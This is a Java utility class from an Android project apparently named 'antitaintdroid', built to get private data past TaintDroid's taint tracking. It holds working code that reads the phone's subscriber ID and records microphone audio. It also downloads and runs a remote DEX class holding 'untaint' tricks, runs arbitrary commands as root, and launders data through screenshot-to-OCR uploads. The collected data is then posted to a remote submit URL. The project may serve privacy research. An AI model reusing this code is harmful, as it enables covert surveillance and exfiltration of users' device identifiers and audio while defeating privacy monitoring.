package com.gsbabil.antitaintdroid;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.RandomAccessFile;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.FileChannel.MapMode;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.ContentBody;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.ByteArrayBuffer;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import dalvik.system.DexClassLoader;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Color;
import android.graphics.Typeface;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.TypedValue;
import android.view.View.MeasureSpec;
import android.widget.TextView;

public class UtilityFunctions {

	@SuppressLint("NewApi")
	public String runRemoteDex(String fullClassName, String methodName,
			String in) {

		String out = new String();

		@SuppressWarnings("unused")
		Class<?> noparams[] = {};

		Class<?>[] paramStr = new Class[1];
		paramStr[0] = String.class;

		Class<?>[] paramInt = new Class[1];
		paramInt[0] = Integer.TYPE;

		String path = MyApp.context.getFilesDir()
				+ File.separator
				+ MyApp.REMOTE_DEX_URL.substring(MyApp.REMOTE_DEX_URL
						.lastIndexOf('/') + 1);

		try {

			DexClassLoader classLoader = new DexClassLoader(path, MyApp.context
					.getFilesDir().getAbsolutePath(), null,
					MyApp.context.getClassLoader());

			Class<?> remoteClass = classLoader
					.loadClass("com.gsbabil.remotedex.UntaintTricks");
			Method remoteMethod = remoteClass.getDeclaredMethod(
					"encodingTrick", paramStr);

			Object obj = remoteClass.newInstance();
			out = (String) remoteMethod.invoke(obj, in);

		} catch (Exception e) {
			Log.d(MyApp.TAG, e.getMessage().toString());
		}

		return out;
	}

	public long httpDownload(String strUrl, String path) {
		int length = 0;

		try {
			URL url = new URL(strUrl);
			File file = new File(path);

			URLConnection ucon = url.openConnection();
			InputStream is = ucon.getInputStream();
			BufferedInputStream bis = new BufferedInputStream(is);
			ByteArrayBuffer baf = new ByteArrayBuffer(50);
			int current = 0;
			while ((current = bis.read()) != -1) {
				baf.append((byte) current);
				length++;
			}

			FileOutputStream fos = new FileOutputStream(file);
			fos.write(baf.toByteArray());
			fos.close();

		} catch (Exception e) {
			Log.d(MyApp.TAG, e.getMessage().toString());
		}

		Log.d(MyApp.TAG, "Downloaded " + length + " bytes");
		return length;
	}

	public void statusUpdate(String msg) {
		TextView tv = (TextView) MyApp.context.findViewById(R.id.textview);
		tv.append(msg);

		try {
			int lineTop = 0;
			try {
				lineTop = tv.getLayout().getLineTop(tv.getLineCount());
			} catch (Throwable e) {
				lineTop = 0;
			}

			final int scrollAmount = lineTop - tv.getHeight();

			if (scrollAmount > 0) {
				tv.scrollTo(0, scrollAmount);
			} else {
				tv.scrollTo(0, 0);
			}

		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
		}
	}

	public Map<String, String> collectPrivateData() {
		Map<String, String> data = new HashMap<String, String>();
		final TelephonyManager tm = (TelephonyManager) MyApp.context
				.getSystemService(Context.TELEPHONY_SERVICE);
		// final String androidId = Secure.getString(
		// MyApp.context.getContentResolver(), Secure.ANDROID_ID);
		// data.put("AndroidId", androidId);
		// data.put("Line1Number", tm.getLine1Number());
		// data.put("CellLocation", tm.getCellLocation().toString());
		// data.put("SimSerialNumber", tm.getSimSerialNumber());
		// data.put("SimOperatorName", tm.getNetworkOperatorName());
		data.put("SubscriberId", tm.getSubscriberId());
//		data.put("DeviceId", tm.getDeviceId());
//		data.put("Microphone", getMicrophoneSample());
//		data.put("Camera", getCameraSample());
//		data.put("Accelerometer", getAccelerometerSample());
		return data;
	}
		
	public String getMicrophoneSample() {
		String out = "";
		String fileName = "microphone.3gp";
		
		MediaRecorder recorder = new MediaRecorder();
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		
		recorder.setOutputFile(MyApp.context.getFilesDir() + "/" + fileName);
		
		try {
			recorder.prepare();
			recorder.start();
			Thread.sleep(5000);
			recorder.stop();
			recorder.release();
			
			File f = new File(MyApp.context.getFilesDir() + "/" + fileName);
			FileInputStream fileIn = MyApp.context.openFileInput(fileName);	
			InputStreamReader isr = new InputStreamReader(fileIn);

			char[] tmpBuf = new char[(int) f.length()];
			isr.read(tmpBuf);
			out = new String(tmpBuf);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return out;
	}

	/**
	 * Source:
	 * http://stackoverflow.com/questions/4349075/bitmapfactory-decoderesource
	 * -returns-a-mutable-bitmap-in-android-2-2-and-an-immu
	 * 
	 * Converts a immutable bitmap to a mutable bitmap. This operation doesn't
	 * allocates more memory that there is already allocated.
	 * 
	 * @param imgIn
	 *            - Source image. It will be released, and should not be used
	 *            more
	 * @return a copy of imgIn, but immutable.
	 */
	public static Bitmap convertBitmapToMutable(Bitmap imgIn) {
		try {
			// this is the file going to use temporally to save the bytes.
			// This file will not be a image, it will store the raw image data.
			File file = new File(MyApp.context.getFilesDir() + File.separator
					+ "temp.tmp");

			// Open an RandomAccessFile
			// Make sure you have added uses-permission
			// android:name="android.permission.WRITE_EXTERNAL_STORAGE"
			// into AndroidManifest.xml file
			RandomAccessFile randomAccessFile = new RandomAccessFile(file, "rw");

			// get the width and height of the source bitmap.
			int width = imgIn.getWidth();
			int height = imgIn.getHeight();
			Config type = imgIn.getConfig();

			// Copy the byte to the file
			// Assume source bitmap loaded using options.inPreferredConfig =
			// Config.ARGB_8888;
			FileChannel channel = randomAccessFile.getChannel();
			MappedByteBuffer map = channel.map(MapMode.READ_WRITE, 0,
					imgIn.getRowBytes() * height);
			imgIn.copyPixelsToBuffer(map);
			// recycle the source bitmap, this will be no longer used.
			imgIn.recycle();
			System.gc();// try to force the bytes from the imgIn to be released

			// Create a new bitmap to load the bitmap again. Probably the memory
			// will be available.
			imgIn = Bitmap.createBitmap(width, height, type);
			map.position(0);
			// load it back from temporary
			imgIn.copyPixelsFromBuffer(map);
			// close the temporary file and channel , then delete that also
			channel.close();
			randomAccessFile.close();

			// delete the temporary file
			file.delete();

		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

		return imgIn;
	}

	public int captureBitmapCache(String in) {
		TextView tv = (TextView) MyApp.context.findViewById(R.id.ocrTextview);
		String tvText = tv.getText().toString();
		float tvTextSize = tv.getTextSize();
		int tvColor = tv.getCurrentTextColor();
		Bitmap bitmap = null;

		tv.setTextSize(36);
		tv.setTextColor(Color.CYAN);
		tv.setTypeface(Typeface.SANS_SERIF);

		tv.setText(in);

		while (bitmap == null) {
			// http://stackoverflow.com/questions/2339429/android-view-getdrawingcache-returns-null-only-null
			tv.measure(MeasureSpec.makeMeasureSpec(0, MeasureSpec.UNSPECIFIED),
					MeasureSpec.makeMeasureSpec(0, MeasureSpec.UNSPECIFIED));
			tv.layout(0, 0, tv.getMeasuredWidth(), tv.getMeasuredHeight());

			tv.setDrawingCacheEnabled(true);
			tv.buildDrawingCache(true);
			bitmap = Bitmap.createBitmap(tv.getDrawingCache());
			tv.destroyDrawingCache();
			tv.setDrawingCacheEnabled(false);
		}

		FileOutputStream fos = null;
		int res = -1;
		try {
			fos = new FileOutputStream(currentDirectory() + "/files/"
					+ MyApp.SCREENSHOT_FILENAME);
			if (fos != null) {
				bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
				fos.close();
				res = 0;
			}
		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
			res = -1;
		}

		tv.setTextSize(TypedValue.COMPLEX_UNIT_PX, tvTextSize);
		tv.setTypeface(Typeface.MONOSPACE);
		tv.setText(tvText);
		tv.setTextColor(tvColor);
		return res;
	}

	@SuppressWarnings("deprecation")
	public String runAsRoot(String command) {
		String output = new String();

		try {
			Process p = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(p.getOutputStream());
			DataInputStream is = new DataInputStream(p.getInputStream());
			os.writeBytes(command + "\n");
			os.flush();

			String line = new String();
			while ((line = is.readLine()) != null) {
				output = output + line;
			}

			os.writeBytes("exit\n");
			os.flush();
		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
		}

		return output;
	}

	@SuppressWarnings("deprecation")
	public String runAsUser(String command) {
		String output = new String();

		try {
			Process p = Runtime.getRuntime().exec("sh");
			DataOutputStream os = new DataOutputStream(p.getOutputStream());
			DataInputStream is = new DataInputStream(p.getInputStream());

			os.writeBytes("exec " + command + "\n");
			os.flush();

			String line = new String();
			while ((line = is.readLine()) != null) {
				output = output + line;
			}

			// os.writeBytes("exit\n");
			os.flush();
			p.waitFor();

		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
		}

		return output;
	}

	public static String currentDirectory() {
		PackageManager pkgManager = MyApp.context.getPackageManager();
		String pkgName = MyApp.context.getPackageName();
		PackageInfo pkg = new PackageInfo();

		try {
			pkg = pkgManager.getPackageInfo(pkgName, 0);
		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
		}

		return pkg.applicationInfo.dataDir;
	}

	public String timeNow() {
		Date now = new Date();
		SimpleDateFormat dateFormatter = new SimpleDateFormat("HH:mm:ss",
				Locale.getDefault());
		String fmtNow = dateFormatter.format(now);

		return fmtNow;
	}

	public String httpFileUpload(String filePath) {
		String sResponse = "";

		HttpClient httpClient = new DefaultHttpClient();
		httpClient.getParams().setParameter(
				CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
		HttpPost httppost = new HttpPost(MyApp.HTTP_OCR_URL);

		MultipartEntity mpEntity = new MultipartEntity();
		File file = new File(filePath);
		ContentBody cbFile = new FileBody(file, "image/png");
		mpEntity.addPart("image", cbFile);
		httppost.setEntity(mpEntity);
		HttpResponse response = null;

		try {
			response = httpClient.execute(httppost);
			BufferedReader reader = new BufferedReader(new InputStreamReader(
					response.getEntity().getContent(), "UTF-8"));

			String line;
			while ((line = reader.readLine()) != null) {
				if (sResponse != null) {
					sResponse = sResponse.trim() + "\n" + line.trim();
				} else {
					sResponse = line;
				}
			}
			Log.i(MyApp.TAG, sResponse);

			HttpEntity resEntity = response.getEntity();
			if (resEntity != null) {
				EntityUtils.consume(resEntity);
			}
			httpClient.getConnectionManager().shutdown();

		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
		}

		return sResponse.trim();
	}

	public String httpSubmit(Map<String, String> data) {
		DefaultHttpClient httpClient = new DefaultHttpClient();
		HttpPost httpPost = new HttpPost(MyApp.HTTP_SUBMIT_URL);
		HttpResponse response = null;
		String sResponse = "";

		HttpParams myHttpParams = new BasicHttpParams();
		HttpConnectionParams.setConnectionTimeout(myHttpParams, MyApp.TIMEOUT);
		HttpConnectionParams.setSoTimeout(myHttpParams, MyApp.TIMEOUT);
		httpClient.setParams(myHttpParams);

		try {
			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			for (Map.Entry<String, String> entry : data.entrySet()) {
				nameValuePairs.add(new BasicNameValuePair(entry.getKey(), entry
						.getValue()));
			}

			httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
			response = httpClient.execute(httpPost);

			BufferedReader reader = new BufferedReader(new InputStreamReader(
					response.getEntity().getContent(), "UTF-8"));

			String line;
			while ((line = reader.readLine()) != null) {
				if (sResponse != null) {
					sResponse = sResponse.trim() + "\n" + line.trim();
				} else {
					sResponse = line;
				}
			}
			Log.i(MyApp.TAG, sResponse);

			HttpEntity resEntity = response.getEntity();
			if (resEntity != null) {
				EntityUtils.consume(resEntity);
			}
			httpClient.getConnectionManager().shutdown();

		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
		}

		return sResponse.trim();
	}

	public String parseJson(String in, String jsonKey) {
		String out = new String();

		try {
			JSONObject jsonObj = new JSONObject(in.trim());
			out = jsonObj.getString(jsonKey);
		} catch (Throwable e) {
			Log.i(MyApp.TAG, "Error parsing JSON" + e.getMessage().toString());
		}

		return out;
	}

}
